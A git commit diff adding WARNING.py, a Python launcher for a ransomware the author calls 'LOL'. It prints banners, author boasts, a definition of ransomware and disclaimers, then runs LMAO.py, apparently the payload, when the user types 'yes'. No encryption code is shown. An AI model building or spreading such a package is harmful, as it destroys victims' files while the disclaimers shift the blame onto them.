6c6438f0ea204623e42e19954b38438e738bfa09
Chai <83523587+CPScript@users.noreply.github.com>
2022-12-15 18:57:45 -0500

    Update WARNING.py

--- WARNING.py
+++ WARNING.py
@@ -1,1 +1,108 @@
+import time
+from time import sleep
+from os import system
+import socket    
+import requests,re,os
+from platform import platform
+from subprocess import call
+import os
 
+
+puk = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]
+
+if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
+    delet = 'cls'
+    dr = '\\'
+else:
+    delet = 'clear'
+    dr = '/'
+    
+    
+print(""""                                                                                                                                       
+ _|    _|    _|_|_|  _|_|_|_|      _|_|_|_|  _|_|_|  _|        _|          _|_|_|    _|_|_|  _|_|_|    _|_|_|_|  _|_|_|_|  _|      _|  
+ _|    _|  _|        _|            _|          _|    _|        _|        _|        _|        _|    _|  _|        _|        _|_|    _|  
+ _|    _|    _|_|    _|_|_|        _|_|_|      _|    _|        _|          _|_|    _|        _|_|_|    _|_|_|    _|_|_|    _|  _|  _|  
+ _|    _|        _|  _|            _|          _|    _|        _|              _|  _|        _|    _|  _|        _|        _|    _|_|  
+   _|_|    _|_|_|    _|_|_|_|      _|        _|_|_|  _|_|_|_|  _|_|_|_|  _|_|_|      _|_|_|  _|    _|  _|_|_|_|  _|_|_|_|  _|      _|  
+                                                                                                                                       
+                                                                                                                                       
+""")
+print("Please wait 10 seconds")
+time.sleep(10)
+os.system(delet)
+
+print("""888       888        d8888 8888888b.  888b    888 8888888 888b    888  .d8888b.  
+888   o   888       d88888 888   Y88b 8888b   888   888   8888b   888 d88P  Y88b 
+888  d8b  888      d88P888 888    888 88888b  888   888   88888b  888 888    888 
+888 d888b 888     d88P 888 888   d88P 888Y88b 888   888   888Y88b 888 888        
+888d88888b888    d88P  888 8888888P"  888 Y88b888   888   888 Y88b888 888  88888 
+88888P Y88888   d88P   888 888 T88b   888  Y88888   888   888  Y88888 888    888 
+8888P   Y8888  d8888888888 888  T88b  888   Y8888   888   888   Y8888 Y88b  d88P 
+888P     Y888 d88P     888 888   T88b 888    Y888 8888888 888    Y888  "Y8888P88 
+                                                                                 
+""")
+time.sleep(2)
+
+
+print("LOL is a RANSOMWARE!!! if you dont know what that is please read section 3")
+print("\------------------------------------------------------------------------/")
+time.sleep(5)
+print(":")
+print(":")
+print(":")
+print("\ ")
+print("| SECTION 1 : About the creator")
+print("| \---------------------------/")
+print("| The crator: CPScript is a 16 year old programer that has nun to do (at the moment) ")
+print("| One of the things that he does in his free time is create programs")
+print("| Even tho the programs arnt realy ethical he has sworn that he will never use them for malitouse use")
+print("| and wishes to never see them used by other people for these purposes")
+print("| CPS is a realy intelegent persone with an IQ of 140 to 150")
+print("| they also are very good at Creating networking tools, malware, viruses, and hacks...")
+print("| IF YOU EVER USE THERE PROGRAMS KNOW THAT THEY ARE NOT RESPONSIBLE and will not take charges/blame for your actions.")
+print("/ ")
+print(":")
+print(":")
+print(":")
+print("\ ")
+print("| SECTION 2 : About the RANSDOMWARE")
+print("| \-------------------------------/")
+print("| the ransomware called LOL was made by CPS but")
+print("| CPS does not want it to be USED FOR MALITOUSE USE")
+print("| it is recomended to run the program in a VM(virtual machine) like Virtual Box or something like that software")
+print("| ")
+print("| THIS IS NO JOKE")
+print("| This Virus will destroy your PC and will not be usable unles you get a new hard drive or disk, all files will be encrypted and or LOST")
+print("| WARNING... if you have a PC in an older windows than WINDOWS 7 pro than it is not recomended to use this program because it will BLUE SCREEN your PC")
+print (":")
+print (":")
+print (":")
+print ("\ ")
+print("| SECTION 3 : What is a Ransomware?")
+print("| \-------------------------------/")
+print("| THE MAIN DEFINITION: A type of malicious software designed to block access to a computer system until a sum of money is paid.")
+print("| THE SIMPLE DEFINITION: A virus that will Encrypt your files untill you pay money then will give you a key/password to unloack them again.")
+print("| THE DUMB DEFINITION: A virus that will lock your files")
+print("| THE BABY DEFINITION: Files go BYE BYE.")
+print("/ ")
+print(":")
+print(":")
+print(":")
+print("\ ")
+print("| SECTION 4: WARNING")
+print("| CPScript is not responsible for any damage")
+print("/ ")
+time.sleep(10)
+print(":")
+print(":")
+print("By typing YES you agree that your responsible for any damage")
+choice = input("")
+
+if choice == "yes":
+    os.system(delet)
+    call(["python", "LMAO.py"])
+  
+  
+if choice == "no":
+    os.system(delet)
+    call(["python", "fail.py"])
